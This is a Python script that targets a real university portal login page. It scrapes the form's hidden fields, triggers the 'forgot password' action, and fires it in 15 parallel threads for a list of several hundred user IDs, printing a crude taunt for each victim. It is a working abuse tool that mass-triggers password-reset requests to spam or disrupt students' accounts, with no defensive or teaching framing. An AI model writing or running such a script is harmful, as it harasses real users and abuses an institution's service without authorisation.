import requests
import sys
from time import sleep
import threading
from bs4 import BeautifulSoup
from constants import USERS, BLACKLIST


url = "http://slcm.manipal.edu"
form = "{}/loginForm.aspx".format(url)

def xprint(mess):
    sys.stdout.write("%s\n" %mess)
 
def get_payload():
    payload = {}
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    for tag in soup.find_all(type="hidden"):
        payload[tag["id"]] = tag["value"]
       
    payload["__EVENTTARGET"]="hrpForgot"
    payload["txtpassword"]=""
    payload["Connection"]="Close"

    return payload


def mail(i, j, user_list) :
        payload = get_payload()
        for x in range(i, j):
            payload["txtUserid"]=user_list[x]
            response = requests.post(form, data=payload)
            soup = BeautifulSoup(response.text, "html.parser")
            sleep(0.5)
            xprint("Fucked {} ( ͡° ͜ʖ ͡°)".format(user_list[x]))

if __name__ == '__main__':
    n = 0
    user_list = [i for i in USERS if i not in BLACKLIST]
    print(len(user_list))
    threads = []
    #exit()
    for i in range(15):
        t1 = threading.Thread(target=mail, args=(n,n+27, user_list))
        n += 27
        threads.append(t1)

    print(len(threads))
    for t in threads:
        t.start()
    for t in threads:
        t.join()
        
    xprint("**ALL COMPLETE**\n")


